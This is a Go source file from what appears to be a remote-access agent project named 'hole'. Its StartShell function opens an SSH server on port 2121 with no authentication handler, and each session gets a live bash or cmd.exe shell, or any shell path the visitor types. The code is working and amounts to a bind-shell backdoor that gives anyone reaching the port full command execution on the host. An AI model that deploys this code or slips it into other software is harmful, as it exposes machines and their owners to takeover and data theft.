package handler

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/gliderlabs/ssh"
	"github.com/kr/pty"
	"github.com/sllt/af/system"
	"github.com/sllt/booby"
	"github.com/sllt/hole/internal/agent/global"
	"github.com/sllt/log"
	"golang.org/x/term"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
)

func commandShellHandler(s ssh.Session) {
	closed := false
	term := term.NewTerminal(s, "")
	shell := confirmShellConfig(s)
	c := exec.Command(shell)
	stdout, err := c.StdoutPipe()
	if err != nil {
		return
	}
	stdin, err := c.StdinPipe()
	if err != nil {
		return
	}
	c.Stderr = s.Stderr()
	c.Start()

	defer func() { closed = true }()

	go func() {
		for {
			if !closed {
				comm, _ := term.ReadLine()
				stdin.Write([]byte(comm + "\r\n"))
			} else {
				break
			}
		}
	}()
	for {
		buffer := make([]byte, 1024)
		length, _ := stdout.Read(buffer)
		if length > 0 {
			s.Write(buffer[:length])
		} else {
			c.Process.Kill()
			break
		}
	}
	c.Wait()

}
func requestUserInput(term *term.Terminal, requestText string, defaultVal string) (val string) {
	_val := defaultVal
	for {
		term.Write([]byte(requestText))
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		if line == "" {
			break
		} else {
			_val = line
			break
		}
	}
	return _val
}
func confirmShellConfig(s ssh.Session) (shell string) {
	term := term.NewTerminal(s, "> ")
	shellPath := requestUserInput(term, "Please input shell path [cmd.exe]: \n", "cmd.exe")
	return shellPath
}

func exit_on_error(message string, err error) {
	if err != nil {
		color.Red(message)
		fmt.Println(err)
		os.Exit(0)
	}
}

func unixShellHandler(s ssh.Session) {
	c := exec.Command("bash")
	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		s.Exit(0)
	}
	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH                        // Initial resize.
	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.

	// Copy stdin to the pty and the pty to stdout.
	// NOTE: The goroutine will keep reading until the next keystroke before returning.
	go func() { _, _ = io.Copy(ptmx, s) }()
	_, _ = io.Copy(s, ptmx)
}

func StartShell(ctx *booby.Context) {
	server := &ssh.Server{
		Addr: ":2121",
		Handler: func(session ssh.Session) {
			if system.IsWindows() {
				commandShellHandler(session)
			} else {
				unixShellHandler(session)
			}
		},
	}
	go server.ListenAndServe()
	global.SshServer = server

	ctx.Write("ok")
}

func StopShell(ctx *booby.Context) {
	global.SshServer.Close()

	ctx.Write("ok")
}
